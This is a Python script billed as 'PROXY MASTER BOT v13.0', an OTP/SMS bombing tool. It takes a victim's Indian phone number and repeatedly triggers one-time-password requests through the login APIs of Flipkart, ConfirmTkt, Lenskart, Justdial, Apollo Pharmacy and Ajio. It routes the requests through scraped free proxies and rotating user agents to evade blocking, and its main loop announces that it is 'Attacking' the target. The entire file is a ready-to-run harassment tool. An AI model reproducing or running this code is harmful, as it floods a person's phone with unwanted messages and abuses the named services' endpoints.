import requests
import os
import time
import random
import json
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0
proxylist = []

# --- 1. PROXY SCRAPER ---
def fetch_proxies():
    global proxylist
    url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
    try:
        r = requests.get(url, timeout=10)
        proxylist = r.text.split()
        print(f"{G}[*] {len(proxylist)} Proxies Loaded!{W}")
    except:
        print(f"{R}[!] Proxy Load Failed, using direct IP.{W}")

def get_random_proxy():
    if proxylist:
        return {'https': 'http://' + random.choice(proxylist)}
    return None

# --- 2. USER AGENT GENERATOR ---
def get_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(agents)

# --- 3. MASTER REQUEST FUNCTION ---
def send_otp(api_name, target):
    global success_count, failed_count
    ua = get_user_agent()
    proxy = get_random_proxy()
    
    # --- SITE SPECIFIC LOGICS ---
    try:
        if api_name == "flipkart":
            url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
            headers = {
                "Origin": "https://www.flipkart.com",
                "Referer": "https://www.flipkart.com/",
                "X-user-agent": f"{ua} FKUA/website/42/website/Desktop",
                "Content-Type": "application/json",
                "User-Agent": ua
            }
            res = requests.post(url, json={"loginId": "+91" + target}, headers=headers, proxies=proxy, timeout=7)
            
        elif api_name == "confirmtkt":
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={target}&newOtp=true"
            headers = {"Referer": "https://www.confirmtkt.com/", "User-Agent": ua}
            res = requests.get(url, headers=headers, proxies=proxy, timeout=7)

        elif api_name == "lenskart":
            url = "https://api.lenskart.com/v2/customers/sendOtp"
            headers = {"Content-Type": "application/json", "x-api-client": "desktop", "User-Agent": ua}
            res = requests.post(url, json={"telephone": target}, headers=headers, proxies=proxy, timeout=7)

        elif api_name == "justdial":
            url = "https://www.justdial.com/functions/whatsappverification.php"
            data = f"mob={target}&vcode=&rsend=0&name=deV"
            headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua}
            res = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=7)

        elif api_name == "apolopharmacy":
            url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
            headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}
            res = requests.post(url, data=f"mobile={target}", headers=headers, proxies=proxy, timeout=7)

        elif api_name == "ajio":
            url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
            headers = {"Content-Type": "application/json", "User-Agent": ua}
            res = requests.post(url, json={"mobileNumber": target}, headers=headers, proxies=proxy, timeout=7)
            if not res.json().get('success'): raise Exception("Ajio Logic Failed")

        # Basic Status Check
        if res.status_code == 200:
            success_count += 1
            print(f"{G}[SUCCESS] {api_name} sent!{W}")
        else:
            failed_count += 1
            print(f"{Y}[-] {api_name} failed (Code: {res.status_code}){W}")

    except:
        failed_count += 1
        print(f"{R}[!] {api_name} Error (Proxy/Block){W}")

# --- 4. MAIN INTERFACE ---
def main():
    os.system("clear")
    print(f"{G}========================================")
    print("      🚀 PROXY MASTER BOT v13.0        ")
    print(f"========================================{W}\n")
    
    target = input(f"{G}Enter Number (without +91): {W}")
    limit = int(input(f"{G}Enter Limit: {W}"))
    
    print(f"\n{Y}[*] Fetching Fresh Proxies...{W}")
    fetch_proxies()

    print(f"\n{G}[*] Attacking {target}...{W}\n")
    
    apis = ["flipkart", "confirmtkt", "lenskart", "justdial", "apolopharmacy", "ajio"]
    
    sent = 0
    while sent < limit:
        for api in apis:
            if sent >= limit: break
            t = threading.Thread(target=send_otp, args=(api, target))
            t.start()
            sent += 1
            time.sleep(0.5)
        time.sleep(1)

    print(f"\n{G}--- DONE | OK: {success_count} | FAIL: {failed_count} ---{W}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{R}Stopped.{W}")
